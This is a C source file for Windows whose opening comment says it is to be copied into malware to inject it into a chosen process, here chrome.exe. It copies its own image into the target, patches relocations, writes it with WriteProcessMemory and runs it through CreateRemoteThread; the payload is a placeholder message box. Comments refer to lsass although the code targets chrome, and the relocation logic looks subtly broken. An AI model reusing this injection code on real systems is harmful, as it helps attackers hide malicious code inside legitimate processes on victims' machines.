#define _CRT_SECURE_NO_WARNINGS
///
///This code snippet is to be copied to your malware. it will inject the malware into the specified process
/// 

#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<String.h>
//Globals and consts
#define INJECTED_PROCESS_COMMAND "Tasklist | findstr chrome.exe"
//This is the function that will be the entry of the run in thr remote process
//The run of the malicious code will start from here
int InjectionEntryPoint()
{
	MessageBoxA(NULL, "HEY", "HEY", NULL);

}


typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


DWORD GetProcessPid(char ProcessName[])
{
	char* Buffer = (char*)calloc(2048, sizeof(char));
	char* FinalOutput = (char*)calloc(100000, sizeof(char));
	//Checking if the memory is allocated
	if (Buffer && FinalOutput == NULL)
	{
		printf("Error allocating memory(%d)", GetLastError());
	}


	FILE* FileHandler;
	FileHandler = _popen(ProcessName, "r");
	while (fgets(Buffer, 2048, FileHandler) != NULL)
	{
		strcat(FinalOutput, Buffer);
	}


	fclose(FileHandler);
	//getting the output of cmd command "tasklist | findstr lsass.exe"
	//the output is some data of the lsass process

	//Parsing the data 
	char* ProcessId = strtok(FinalOutput, " ");

	//taking the first token which is the pid
	ProcessId = strtok(NULL, " ");

	//converting it to int
	int IntProcessId;
	sscanf(ProcessId, "%d", &IntProcessId);

	free(Buffer);
	free(FinalOutput);
	//returning lsass's pid
	return (DWORD)IntProcessId;
}

int InjectMalwareByPid(DWORD Pid)
{
	DWORD RemoteAddress = NULL;

	
	HANDLE Process = OpenProcess(MAXIMUM_ALLOWED, FALSE, Pid);
	//Getting the sizeofimage
	void* LocalProcess = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)LocalProcess;
	PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)LocalProcess + DosHeader->e_lfanew);
	//Allocating remote memory
	RemoteAddress = VirtualAllocEx(Process, NULL, NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//Allocating local memory
	void* PatchedImage = VirtualAlloc(NULL, NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	//Copying the current image
	memcpy(PatchedImage, (void*)LocalProcess, NtHeaders->OptionalHeader.SizeOfImage);
	//Getting to the reloc table of the Patched image
	PIMAGE_BASE_RELOCATION RelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)PatchedImage + NtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress);
	//Delta between images
	DWORD_PTR Delta = (DWORD_PTR)RemoteAddress - (DWORD_PTR)LocalProcess;
	//Iterating the reloc table and patching the addresses


	PDWORD_PTR PatchedAddresses;
	PBASE_RELOCATION_ENTRY RelocTableRelativeAddress = 0;
	DWORD Entries = 0;


	while (RelocationTable->SizeOfBlock > 0)
	{
		//the number of entries is calculating by getting to the relocation's table block,
		// the block size that contains the size of the image base relocation.
		//by substracting the image base relocation size well get the size only 
		//of the block. each block contains 2 bytes, 1 for address and 1 for type
		Entries = (RelocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / (sizeof(int) / 2);
		//proceeding blocks
		RelocTableRelativeAddress = (PBASE_RELOCATION_ENTRY)(RelocationTable + 1);

		for (short i = 0; i < Entries; i++)
		{
			if (RelocTableRelativeAddress[i].Offset == 1)
			{
				PatchedAddresses = (PDWORD_PTR)((DWORD_PTR)PatchedImage + RelocationTable->VirtualAddress + RelocTableRelativeAddress[i].Offset);
				*PatchedAddresses += Delta;
			}
		}
		RelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)RelocationTable + RelocationTable->SizeOfBlock);
	}


	//Injecting our whole p-atched image to the remote process using Ntdll!WriteProcessMemory
	WriteProcessMemory(Process, RemoteAddress, PatchedImage, NtHeaders->OptionalHeader.SizeOfImage, NULL);
	//Creating a remote threa that will run the injected image in the target's procees memory space
	CreateRemoteThread(
		Process,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + Delta),
		NULL,
		0,
		NULL);


	
	
}



int main()
{
	InjectMalwareByPid(GetProcessPid(INJECTED_PROCESS_COMMAND));
	
}







